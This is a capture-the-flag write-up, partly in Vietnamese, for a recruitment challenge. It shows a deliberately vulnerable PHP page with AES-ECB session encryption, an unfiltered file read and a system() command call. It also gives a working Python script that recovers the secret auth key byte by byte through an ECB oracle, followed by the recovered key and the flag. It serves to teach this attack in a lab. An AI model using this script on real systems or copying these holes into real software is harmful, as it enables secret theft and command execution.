# KCSC Recruit Memmbers - Encrypted-boizzz

## Description
```
IP
```

**Author**: `nhienit`

# Solution
Write-up dựa trên: https://github.com/d47sec/CTF-Writeups/tree/main/EnCryptBoizzz, mình viết lại nhằm mục đích cá nhân là note các ý mình chưa hiểu, lưu trữ và ghi nhớ.

`source-code:`
```php
<?php

session_start();
@require_once 'config.php';

if (isset($_GET['debug'])) {
    show_source(__FILE__);
    die();
}

define('BLOCK_SIZE', 16);

function pad($string) {
    if (strlen($string) % BLOCK_SIZE === 0)
        $plaintext = $string;
    else  {
        $s = BLOCK_SIZE - strlen($string) % BLOCK_SIZE;
        $plaintext = $string.str_repeat(chr($s), $s);
    } 
    return $plaintext;
}
function encrypt($name) {
    global $auth_key, $key_for_enc; // from config.php with luv!!

    $method = 'AES-128-ECB';
    $plaintext = pad($name.$auth_key);
    return bin2hex(openssl_encrypt($plaintext, $method, $key_for_enc, OPENSSL_RAW_DATA));
}

if (isset($_GET["name"])) 
    $_SESSION["name"] = encrypt($_GET['name']);

if (isset($_GET['file'])) { // safe() in config.php, try to guess my filter =))
    if (safe($_GET['file'])) 
        @readfile($_GET['file']);
    else die("Dont hack me please =((((");
}

if (isset($_GET['auth_key'])) {
    if ($_GET['auth_key'] === $auth_key) {
        if ( isset($_GET["command"]) && strlen($_GET["command"]) <= 5)
            @system($_GET["command"]);
    }
    else echo "Wrong auth_key!!";
}

?>


<h1>Hello hacker ^>^ </h1>

<!-- 
// TODO: Remove 

<strong>To debug, use ?debug=hint </strong>
-->
```

At 3 bytes tang 1 block
At 19 bytes tang them 1 block Cứ mỗi 16 bytes tăng 1 block--> `16 bytes encryption`


```python
params = {
    'name': 'A' * 32,
}
```
`result`:
```
5673760b1cc65c36 5e93fa8f4317a2c4
16 bytes 'A'    | auth_key + padding    
5673760b1cc65c36 5e93fa8f4317a2c4
16 bytes 'A'    | auth_key + paddin
ddef00dfaf0fc11d ed05777122bec5c5
5fec0e7366a611d0 6db4ea75b91cedc3
```
**References**: https://zachgrace.com/posts/attacking-ecb/
1234567891234567 1234567891234567
AAAAAAAAAAAAAAAs cretkeyPPPPPPPPP
               ^
        brute-force this!! --> so sánh với block trước

**Tool exploit**:
```python
import requests
import re # for practice
import string

characters = string.digits + string.ascii_letters # characters for auth key

url = 'http://localhost:2010'
s = requests.Session()

cookies = {
    'PHPSESSID': '3da7886124215d24e99cc58c90072051'
}

def check():
    params = {
        'file': '/tmp/sess_3da7886124215d24e99cc58c90072051'
    }
    r = s.get(url, cookies=cookies, params=params)
    cipher = re.findall('"(.*)"', r.text)[0] # capture group(return)

    return cipher[:16] == cipher[32:48]

auth_key = ''
for i in range(15, -1, -1):
    for c in characters:
        params = {
            'name': 'a' * i + auth_key + c + 'a' * i
        }

        r = s.get(url, cookies=cookies, params=params)

        if check():
            auth_key += c
            print('[+] FOUND: ' + auth_key)
            break
        else:
            print('[-] FAILED at ' + str(i) + ': ' + c)

# AuthKey4N00b3r
```
**Auth key**: `AuthKey4N00b3r`

**flag**: `KCSC{Hello hacker! Hello new member ! Hello our talent <3}`
